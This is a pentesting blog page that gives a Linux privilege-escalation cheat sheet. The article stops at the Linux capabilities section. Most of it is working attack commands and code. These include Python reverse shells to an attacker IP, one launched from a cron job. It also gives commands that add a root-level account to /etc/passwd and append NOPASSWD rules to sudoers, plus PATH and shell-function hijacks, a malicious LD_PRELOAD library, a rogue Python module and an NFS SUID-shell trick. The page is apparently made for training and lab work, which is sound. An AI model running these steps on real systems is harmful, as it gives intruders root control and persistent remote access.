<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/uploads/logo/windows-linux.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/uploads/logo/windows-linux.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/uploads/logo/windows-linux.png">
  <link rel="mask-icon" href="/uploads/logo/windows-linux.png" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"chronossec.site","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"always","padding":18,"offset":12},"copycode":{"enable":true,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="Step 6 in a penetration test: Privilege escalation.Upgrade permissions, gain access to more resources, become root.">
<meta property="og:type" content="article">
<meta property="og:title" content="6. Privilege escalation - Linux">
<meta property="og:url" content="https://chronossec.site/Pentesting/Linux/6/index.html">
<meta property="og:site_name" content="Chronos Security">
<meta property="og:description" content="Step 6 in a penetration test: Privilege escalation.Upgrade permissions, gain access to more resources, become root.">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2024-08-02T11:00:00.000Z">
<meta property="article:modified_time" content="2024-09-22T17:57:00.994Z">
<meta property="article:author" content="ChronosPK | Marin Radu">
<meta property="article:tag" content="Pentesting">
<meta property="article:tag" content="Linux">
<meta property="article:tag" content="Privesc">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://chronossec.site/Pentesting/Linux/6/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://chronossec.site/Pentesting/Linux/6/","path":"Pentesting/Linux/6/","title":"6. Privilege escalation - Linux"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>6. Privilege escalation - Linux | Chronos Security</title>
  
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-GMH7MEYY9C"></script>
  <script class="next-config" data-name="google_analytics" type="application/json">{"tracking_id":"G-GMH7MEYY9C","only_pageview":false,"measure_protocol_api_secret":null}</script>
  <script src="/js/third-party/analytics/google-analytics.js"></script>



  <script data-pjax defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{&quot;token&quot;: &quot;99fd3273ef2c49c9af35e952ce7e7f18&quot;}'></script>





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Chronos Security</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">Sharing knowledge</p>
      <img class="custom-logo-image" src="/uploads/logo/windows-linux.png" alt="Chronos Security">
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">16</span></a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">38</span></a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Reverse-shell-from-privileged-python-script"><span class="nav-text">Reverse shell from privileged python script</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Files-with-SUID-and-SGID-bit"><span class="nav-text">Files with SUID and SGID bit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Edit-etc-passwd"><span class="nav-text">Edit &#x2F;etc&#x2F;passwd</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Append-user-to-sudoers"><span class="nav-text">Append user to sudoers</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SUDO-permissions-with-preserved-environment"><span class="nav-text">SUDO permissions with preserved environment</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Relative-PATH-call-to-an-executable"><span class="nav-text">Relative PATH - call to an executable</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Relative-PATH-call-to-a-shell-function"><span class="nav-text">Relative PATH - call to a shell function</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LD-PRELOAD-SUID"><span class="nav-text">LD_PRELOAD SUID</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Writable-crontab"><span class="nav-text">Writable crontab</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Symbolic-link-symlinks"><span class="nav-text">Symbolic link (symlinks)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Import-modified-python-module"><span class="nav-text">Import modified python module</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NFS-no-root-squash-no-all-squash"><span class="nav-text">NFS no_root_squash &#x2F; no_all_squash</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux-capabilities"><span class="nav-text">Linux capabilities</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tar-wildcard-with-cron-job"><span class="nav-text">tar wildcard (with cron job)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Restart-service"><span class="nav-text">Restart service</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Shell-in-input-prompt"><span class="nav-text">Shell in input prompt</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="ChronosPK | Marin Radu"
      src="/uploads/logo/windows-linux.png">
  <p class="site-author-name" itemprop="name">ChronosPK | Marin Radu</p>
  <div class="site-description" itemprop="description">CTFs, writeups, cheatsheets, and explanations in cybersecurity</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">39</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">16</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">38</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/ChronosPK" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ChronosPK" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:chronos@chronossec.site" title="E-Mail → mailto:chronos@chronossec.site" rel="noopener me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://linkedin.com/in/radumarin001/" title="LinkedIn → https:&#x2F;&#x2F;linkedin.com&#x2F;in&#x2F;radumarin001&#x2F;" rel="noopener me" target="_blank"><i class="fab fa-linkedin fa-fw"></i>LinkedIn</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://instagram.com/chronos_security" title="Instagram → https:&#x2F;&#x2F;instagram.com&#x2F;chronos_security" rel="noopener me" target="_blank"><i class="fab fa-instagram fa-fw"></i>Instagram</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://www.paypal.com/donate/?hosted_button_id=UXZC74DREB9W8" title="PayPal → https:&#x2F;&#x2F;www.paypal.com&#x2F;donate&#x2F;?hosted_button_id&#x3D;UXZC74DREB9W8" rel="noopener me" target="_blank"><i class="fab fa-paypal fa-fw"></i>PayPal</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://buymeacoffee.com/chronossec" title="buymeacoffee → https:&#x2F;&#x2F;buymeacoffee.com&#x2F;chronossec" rel="noopener me" target="_blank"><i class="fa fa-coffee fa-fw"></i>buymeacoffee</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://github.com/sponsors/ChronosPK" title="GitHub Sponsor → https:&#x2F;&#x2F;github.com&#x2F;sponsors&#x2F;ChronosPK" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub Sponsor</a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>

        </div>
      </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          Links
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <a href="/categories/CTFs/CSCTF-2024/" title="&#x2F;categories&#x2F;CTFs&#x2F;CSCTF-2024&#x2F;">CSTFs - CSCTF 2024</a>
            </li>
            <li class="links-of-blogroll-item">
              <a href="/categories/Pentesting/Linux/" title="&#x2F;categories&#x2F;Pentesting&#x2F;Linux&#x2F;">Pentesting - Linux</a>
            </li>
            <li class="links-of-blogroll-item">
              <a href="/categories/Pentesting/Windows/" title="&#x2F;categories&#x2F;Pentesting&#x2F;Windows&#x2F;">Pentesting - Windows</a>
            </li>
            <li class="links-of-blogroll-item">
              <a href="/" title=""></a>
            </li>
        </ul>
      </div>
    </div>
        <div class="pjax">
        </div>
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://chronossec.site/Pentesting/Linux/6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/uploads/logo/windows-linux.png">
      <meta itemprop="name" content="ChronosPK | Marin Radu">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Chronos Security">
      <meta itemprop="description" content="CTFs, writeups, cheatsheets, and explanations in cybersecurity">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="6. Privilege escalation - Linux | Chronos Security">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          6. Privilege escalation - Linux
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 22-09-2024 20:57:00" itemprop="dateModified" datetime="2024-09-22T20:57:00+03:00">22-09-2024</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Pentesting/" itemprop="url" rel="index"><span itemprop="name">Pentesting</span></a>
        </span>
          , 
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Pentesting/Linux/" itemprop="url" rel="index"><span itemprop="name">Linux</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><hr>
<p>Step 6 in a penetration test: Privilege escalation.<br>Upgrade permissions, gain access to more resources, become <code>root</code>. </p>
<hr>
<span id="more"></span>

<br>

<h2 id="Reverse-shell-from-privileged-python-script"><a href="#Reverse-shell-from-privileged-python-script" class="headerlink" title="Reverse shell from privileged python script"></a>Reverse shell from privileged python script</h2><pre><code class="highlight python">IP=<span class="string">&quot;10.10.14.10&quot;</span>
PORT=<span class="number">4444</span>
<span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((IP,PORT));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>);os.dup2(s.fileno(),<span class="number">2</span>);<span class="keyword">import</span> pty; pty.spawn(<span class="string">&quot;sh&quot;</span>)</code></pre>

<br>

<h2 id="Files-with-SUID-and-SGID-bit"><a href="#Files-with-SUID-and-SGID-bit" class="headerlink" title="Files with SUID and SGID bit"></a>Files with SUID and SGID bit</h2><blockquote>
<p>SUID (set user ID) and GUID (set group ID) bits are flags set on Linux ELF executables, allowing any user to run them as the owner (impersonate the owner).</p>
</blockquote>
<p><strong>Test</strong></p>
<pre><code class="highlight bash"><span class="comment"># suid</span>
find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null
<span class="comment"># sgid</span>
find / -perm -u=g -<span class="built_in">type</span> f 2&gt;/dev/null
<span class="comment"># both</span>
find / -<span class="built_in">type</span> f \( -perm -4000 -o -perm -2000 \) -<span class="built_in">exec</span> <span class="built_in">ls</span> -l &#123;&#125; \; 2&gt;/dev/null</code></pre>
<p>Executables you should look for:</p>
<pre><code class="highlight bash">/usr/bin/passwd
/usr/bin/sudo
/bin/su
/usr/bin/chsh
/usr/bin/chfn
/bin/mount
/bin/umount
/usr/bin/locate
/usr/bin/at</code></pre>
<pre><code class="highlight bash">/usr/bin/newgrp
/usr/bin/execute
/usr/bin/gpasswd</code></pre>

<p><strong>Exploit</strong><br>Example with <code>doas</code> executable</p>
<pre><code class="highlight bash">doas -u root /bin/bash</code></pre>

<br>

<h2 id="Edit-etc-passwd"><a href="#Edit-etc-passwd" class="headerlink" title="Edit /etc/passwd"></a>Edit <code>/etc/passwd</code></h2><blockquote>
<p><code>/etc/passwd</code> file contains info about user accounts on the machine. Adding an entry (a line) to this file allows us to create a custom user with predefined UID and GID.</p>
</blockquote>
<p><strong>Test</strong></p>
<pre><code class="highlight bash"></code></pre>

<p><strong>Exploit</strong><br>Create a user <code>chronos</code> with password <code>chronos</code>. User and group ID are <code>0</code>.</p>
<pre><code class="highlight bash"><span class="built_in">echo</span> <span class="string">&#x27;chronos:$1$d7venmwO$dSO1eZg6GvVd/ihQLdb6K/:0:0::/root:/bin/bash&#x27;</span> &gt;&gt; /etc/passwd</code></pre>

<br>

<h2 id="Append-user-to-sudoers"><a href="#Append-user-to-sudoers" class="headerlink" title="Append user to sudoers"></a>Append user to sudoers</h2><blockquote>
<p><code>/etc/sudoers</code> file defines the users who can run commands as <code>root</code>. If we can modify it, we can give our current user privileged permissions.</p>
</blockquote>
<p><strong>Test</strong></p>
<pre><code class="highlight bash"><span class="built_in">sudo</span> visudo -f /etc/sudoers</code></pre>

<p><strong>Exploit</strong><br>Add user to <code>/etc/sudoers</code></p>
<pre><code class="highlight bash"><span class="built_in">echo</span> <span class="string">&#x27;username        ALL=(ALL)        NOPASSWD: ALL&#x27;</span> &gt;&gt; /etc/sudoers</code></pre>
<p>Possibilities:</p>
<pre><div class="caption"><span>all commands</span></div><code class="highlight bash">chronos ALL=(ALL:ALL) ALL
chronos ALL=(root) NOPASSWD: ALL</code></pre>
<pre><div class="caption"><span>specific command only</span></div><code class="highlight bash">chronos ALL=(root) NOPASSWD: /usr/bin/command</code></pre>

<br>

<h2 id="SUDO-permissions-with-preserved-environment"><a href="#SUDO-permissions-with-preserved-environment" class="headerlink" title="SUDO permissions with preserved environment"></a>SUDO permissions with preserved environment</h2><blockquote>
<p>You need to set the PATH variable when running the command</p>
</blockquote>
<p><strong>Test</strong></p>
<pre><code class="highlight bash"><span class="built_in">sudo</span> -l</code></pre>
<pre><code class="highlight plain">(root) SETENV: NOPASSWD: command</code></pre>

<p><strong>Exploit</strong><br>Create a custom script named after the <code>nopasswd</code> command</p>
<pre><code class="highlight plaintext">echo &#x27;/bin/bash -p&#x27; &gt; /tmp/command
chmod +x /tmp/command</code></pre>
<p>Run it</p>
<pre><code class="highlight bash"><span class="built_in">sudo</span> PATH=/tmp:<span class="variable">$PATH</span> <span class="built_in">command</span></code></pre>

<br>

<h2 id="Relative-PATH-call-to-an-executable"><a href="#Relative-PATH-call-to-an-executable" class="headerlink" title="Relative PATH - call to an executable"></a>Relative PATH - call to an executable</h2><blockquote>
<p>A relative PATH vulnerability occurs when a script or binary calls another executable (like service) without specifying its full path. This allows attackers to create a malicious executable with the same name and manipulate the PATH variable to escalate privileges, especially if the vulnerable script is SUID.</p>
</blockquote>
<p><strong>Test</strong></p>
<blockquote>
<p>Look for scripts&#x2F;binaries calling executables without full paths<br>Imagine <code>/home/user/vulnerable</code> calls the <code>service</code> binary without specifying the full path</p>
</blockquote>
<pre><code class="highlight bash">strings /home/user/vulnerable</code></pre>

<p><strong>Exploit</strong><br>Create a custom executable</p>
<pre><div class="caption"><span>/tmp/service</span></div><code class="highlight bash"><span class="built_in">echo</span> <span class="string">&#x27;int main() &#123; setgid(0); setuid(0); system(&quot;/bin/bash&quot;); return 0; &#125;&#x27;</span> &gt; /tmp/service.c
gcc /tmp/service.c -o /tmp/service</code></pre>
<p>Manipulate the <code>PATH</code> and execute the vulnerable script&#x2F;binary</p>
<pre><code class="highlight bash"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span> <span class="comment"># because our script called service is found in /tmp</span>
/home/user/vulnerable</code></pre>

<br>

<h2 id="Relative-PATH-call-to-a-shell-function"><a href="#Relative-PATH-call-to-a-shell-function" class="headerlink" title="Relative PATH - call to a shell function"></a>Relative PATH - call to a shell function</h2><blockquote>
<p>This exploit leverages the ability to override a system command with a shell function. When a script or binary calls a command without specifying its full path, you can define a function with the same name to execute malicious code instead. If combined with a SUID binary, this can lead to privilege escalation.</p>
</blockquote>
<p><strong>Test</strong></p>
<blockquote>
<p>Look for scripts&#x2F;binaries calling executables without full paths<br>Imagine <code>/home/user/vulnerable</code> calls the <code>service</code> binary without specifying the full path</p>
</blockquote>
<pre><code class="highlight bash">strings /home/user/vulnerable</code></pre>

<p><strong>Exploit</strong><br>Create a malicious function</p>
<pre><code class="highlight bash"><span class="keyword">function</span> /usr/sbin/service() &#123; <span class="built_in">cp</span> /bin/bash /tmp &amp;&amp; <span class="built_in">chmod</span> +s /tmp/bash &amp;&amp; /tmp/bash -p; &#125;</code></pre>
<p>Export the function</p>
<pre><code class="highlight bash"><span class="built_in">export</span> -f /usr/sbin/service</code></pre>
<p>Run the script&#x2F;binary that calls the service</p>
<pre><code class="highlight bash">/home/user/vulnerable</code></pre>

<br>

<h2 id="LD-PRELOAD-SUID"><a href="#LD-PRELOAD-SUID" class="headerlink" title="LD_PRELOAD SUID"></a>LD_PRELOAD SUID</h2><blockquote>
<p>LD_PRELOAD is an environment variable used in Unix-like operating systems that allows you to specify additional shared libraries to be loaded before others. This can override existing functions in the target program’s shared libraries.</p>
</blockquote>
<p><strong>Test</strong></p>
<pre><code class="highlight bash"><span class="built_in">sudo</span> -l</code></pre>
<pre><code class="highlight plain">Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD</code></pre>

<p><strong>Exploit</strong></p>
<pre><code class="highlight bash"><span class="built_in">env</span> <span class="comment"># look for LD_PRELOAD</span></code></pre>
<pre><div class="caption"><span>/tmp/malicious.c - create a library that overrides the standard one</span></div><code class="highlight c"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span>
<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span>
<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span>

<span class="type">void</span> _init() &#123;
    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);
    setgid(<span class="number">0</span>);
    setuid(<span class="number">0</span>);
    system(<span class="string">&quot;/bin/bash&quot;</span>);
&#125;</code></pre>
<pre><div class="caption"><span>compile the shared library</span></div><code class="highlight bash">gcc -fPIC -shared -o /tmp/malicious.so /tmp/malicious.c -nostartfiles</code></pre>
<pre><div class="caption"><span>set the new library</span></div><code class="highlight bash"><span class="built_in">export</span> LD_PRELOAD=/tmp/malicious.so
<span class="built_in">printenv</span> LD_PRELOAD</code></pre>
<pre><div class="caption"><span>run a program such as apache</span></div><code class="highlight bash"><span class="built_in">sudo</span> LD_PRELOAD=/tmp/malicious.so apache2</code></pre>

<br>

<h2 id="Writable-crontab"><a href="#Writable-crontab" class="headerlink" title="Writable crontab"></a>Writable crontab</h2><blockquote>
<p>Define commands that should be executed on the system at regular intervals</p>
</blockquote>
<p><strong>Test</strong></p>
<pre><code class="highlight bash">(crontab -l; <span class="built_in">echo</span> <span class="string">&quot;* * * * * /bin/echo &#x27;Crontab is writable&#x27; &gt; /tmp/crontab_test&quot;</span>) | crontab -</code></pre>

<p><strong>Exploit</strong><br>Extract attacker IP</p>
<pre><code class="highlight bash">ip a s</code></pre>
<p>Add line to crontab (open <code>nano</code> editor)</p>
<pre><code class="highlight bash">crontab -e</code></pre>
<pre><div class="caption"><span>crontab command</span></div><code class="highlight bash">* * * * * python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.10&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></code></pre>

<br>

<h2 id="Symbolic-link-symlinks"><a href="#Symbolic-link-symlinks" class="headerlink" title="Symbolic link (symlinks)"></a>Symbolic link (symlinks)</h2><blockquote>
<p>An attacker can create a symbolic link pointing to a sensitive or writable file (e.g., a file with elevated privileges). If a privileged process or script follows this symlink and modifies the target file, it can lead to unauthorized actions.</p>
<ol>
<li>Find a writable directory that is accessible to a user who can exploit it.</li>
<li>Identify a script or process running as a privileged user that might follow symbolic links.</li>
<li>Create a symbolic link in that writable directory pointing to a sensitive or critical file that the privileged process might interact with.</li>
</ol>
</blockquote>
<p><strong>Test</strong></p>
<pre><div class="caption"><span>Find writable directories</span></div><code class="highlight bash">find / -<span class="built_in">type</span> d -writable 2&gt;/dev/null</code></pre>
<pre><div class="caption"><span>List processes with elevated privileges (e.g., cron jobs)</span></div><code class="highlight bash">ps aux | grep -E <span class="string">&#x27;(crond|atd|systemd|root)&#x27;</span></code></pre>

<p><strong>Exploit</strong></p>
<pre><div class="caption"><span>Create a symlink in a writable directory</span></div><code class="highlight bash"><span class="built_in">cd</span> /tmp
<span class="built_in">ln</span> -s /etc/passwd /tmp/my_symlink</code></pre>
<pre><div class="caption"><span>Trigger the privileged process</span></div><code class="highlight bash"><span class="built_in">touch</span> /tmp/my_symlink</code></pre>
<pre><div class="caption"><span>Verify exploitation</span></div><code class="highlight bash"><span class="built_in">ls</span> -l /etc/passwd</code></pre>

<br>

<h2 id="Import-modified-python-module"><a href="#Import-modified-python-module" class="headerlink" title="Import modified python module"></a>Import modified <code>python</code> module</h2><blockquote>
<p>Python scripts running with elevated privileges can be exploited if they import modules from directories writable by untrusted users. An attacker can place a malicious library in such a directory to execute arbitrary code with elevated privileges.</p>
<ul>
<li><strong>Identify the target script</strong>: Find a script running as a privileged user that imports modules.</li>
<li><strong>Writable directory</strong>: Determine if the script imports from a directory writable by non-privileged users.</li>
<li><strong>Create a malicious module</strong>: Place a malicious module in the writable directory.</li>
<li><strong>Exploit</strong>: When the script imports the malicious module, it executes the attacker’s code with elevated privileges.</li>
</ul>
</blockquote>
<p><strong>Test</strong><br>Example: <code>/priv/vuln.py</code> imports a custom module from writable directory <code>/home/user</code></p>
<pre><div class="caption"><span>/priv/vuln.py</span></div><code class="highlight python"><span class="keyword">import</span> some_module
...</code></pre>
<pre><div class="caption"><span>Module search path for this script</span></div><code class="highlight bash">python3 -c <span class="string">&quot;import sys; print(sys.path)&quot;</span></code></pre>
<pre><div class="caption"><span>Example outputs</span></div><code class="highlight bash">[<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/usr/lib/python3.8&#x27;</span>, <span class="string">&#x27;/usr/lib/python3.8/plat-x86_64-linux-gnu&#x27;</span>, <span class="string">&#x27;/usr/lib/python3.8/lib-dynload&#x27;</span>, <span class="string">&#x27;/home/user/.local/lib/python3.8/site-packages&#x27;</span>, <span class="string">&#x27;/usr/local/lib/python3.8/dist-packages&#x27;</span>, <span class="string">&#x27;/home/user&#x27;</span>]</code></pre>
<p>If one of those is <code>/home/user</code> (the writable directory), we can exploit the vulnerable script.</p>
<p><strong>Exploit</strong></p>
<pre><div class="caption"><span>Create a malicious module</span></div><code class="highlight bash"><span class="built_in">echo</span> <span class="string">&quot;import os; os.system(&#x27;/bin/bash&#x27;)&quot;</span> &gt; /home/user/some_module.py</code></pre>
<pre><div class="caption"><span>Run the privileged script with updated module</span></div><code class="highlight bash"><span class="built_in">sudo</span> python3 /priv/vuln.py</code></pre>


<br>

<h2 id="NFS-no-root-squash-no-all-squash"><a href="#NFS-no-root-squash-no-all-squash" class="headerlink" title="NFS no_root_squash &#x2F; no_all_squash"></a>NFS <code>no_root_squash</code> &#x2F; <code>no_all_squash</code></h2><blockquote>
<p><code>no_root_squash</code>: Allows root user on NFS client to retain root privileges on the NFS server.<br><code>no_all_squash</code>: Prevents mapping of all users to anonymous user (nobody), keeping their original privileges.</p>
</blockquote>
<p><strong>Test</strong></p>
<pre><div class="caption"><span>command</span></div><code class="highlight bash"><span class="built_in">cat</span> /etc/exports</code></pre>
<pre><div class="caption"><span>example output</span></div><code class="highlight plain">/home/chronos *(rw,fsid=0,sync,no_root_squash,insecure)</code></pre>

<p><strong>Exploit</strong> - 1. attacker machine</p>
<pre><div class="caption"><span>mount the NFS share</span></div><code class="highlight bash"><span class="built_in">mkdir</span> /mnt/nfs
mount -t nfs <span class="variable">$IP</span>:/path/to/share /mnt/nfs</code></pre>
<pre><div class="caption"><span>create a root-owned file and a SUID shell</span></div><code class="highlight bash"><span class="built_in">touch</span> /mnt/nfs/root_owned_file
<span class="built_in">echo</span> <span class="string">&#x27;#!/bin/bash&#x27;</span> &gt; /mnt/nfs/suid_shell
<span class="built_in">echo</span> <span class="string">&#x27;chmod +s /bin/bash&#x27;</span> &gt;&gt; /mnt/nfs/suid_shell
<span class="built_in">chmod</span> +x /mnt/nfs/suid_shell</code></pre>
<p><strong>Exploit</strong> - 2. victim machine</p>
<pre><div class="caption"><span>execute the payload</span></div><code class="highlight bash">/mnt/nfs/suid_shell
/bin/bash -p</code></pre>

<br>

<h2 id="Linux-capabilities"><a href="#Linux-capabilities" class="headerlink" title="Linux capabilities"></a>Linux capabilities</h2><blockquote>
<p>Linux capabilities allow programs to perform privileged operations without granting full root permissions. When a binary has capabilities like cap_setuid, it can be exploited to gain root privileges.<br>This applies to any binary, but we’ll use <code>python</code> as an example.</p>
</blockquote>
